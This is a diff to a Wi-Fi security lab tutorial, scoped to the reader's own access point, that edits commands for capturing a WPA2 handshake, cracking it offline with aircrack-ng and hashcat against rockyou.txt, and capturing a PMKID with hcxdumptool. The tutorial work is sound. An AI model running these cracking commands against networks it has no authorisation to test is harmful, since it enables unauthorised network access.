@@ -120,8 +120,8 @@ sudo airodump-ng --band abg wlan0mon      # scan 2.4 + 5 GHz
  BSSID              PWR  Beacons  #Data  CH  ENC  CIPHER AUTH ESSID
  AA:BB:CC:11:22:33  -42     120     540   6  WPA2 CCMP   PSK  MyLabAP   <- your AP
                                                                         (note CH 6)
- STATION            PWR   Rate    Lost   Frames  Probe
- AA:BB:CC:11:22:33  DE:AD:BE:EF:00:01  -50  0-1  0  312           <- a client on it
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+ AA:BB:CC:11:22:33  DE:AD:BE:EF:00:01  -50    0 - 1      0      312         <- a client on it
 ```
 
 ```bash
@@ -175,13 +175,13 @@ With a valid handshake captured, cracking is a purely offline, target-free
 dictionary attack.
 
 ```bash
+# rockyou.txt ships gzipped on Kali; expand it once before first use:
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
+
 # [Level 2+: Advanced / Field Ops] Dictionary attack against the handshake
 sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
                  -b AA:BB:CC:11:22:33 handshake-01.cap
 #   -w wordlist   -b target BSSID   <capture file>
-
-# rockyou.txt ships gzipped on Kali; expand it once:
-sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
 ```
 
 Expected on success:
@@ -211,7 +211,8 @@ hcxpcapngtool -o handshake.22000 handshake-01.cap
 hashcat -m 22000 handshake.22000 /usr/share/wordlists/rockyou.txt
 
 # Add rules to mutate the wordlist (l33t-speak, appended digits, etc.)
-hashcat -m 22000 handshake.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 22000 handshake.22000 /usr/share/wordlists/rockyou.txt \
+        -r /usr/share/hashcat/rules/best64.rule
 ```
 
 ### PMKID attack (clientless, when supported)
@@ -221,9 +222,10 @@ required:
 
 ```bash
 # [Level 2+: Advanced / Field Ops] Capture PMKID directly
-# hcxdumptool (6.3+ / 7.x) drives the adapter itself: give it the MANAGED
-# interface (wlan0, not wlan0mon), don't run airmon-ng first, and stop the
-# services that would fight it for the radio.
+# Written for hcxdumptool 7.x, the version Kali ships (`hcxdumptool --version`
+# prints "hcxdumptool 7.1.2" at the time of writing). It drives the adapter
+# itself: give it the MANAGED interface (wlan0, not wlan0mon), don't run
+# airmon-ng first, and stop the services that would fight it for the radio.
 sudo systemctl stop NetworkManager wpa_supplicant
 # Stay in scope: compile a BPF that only matches YOUR access point's BSSID
 hcxdumptool --bpfc="wlan addr3 112233445566" > scope.bpf
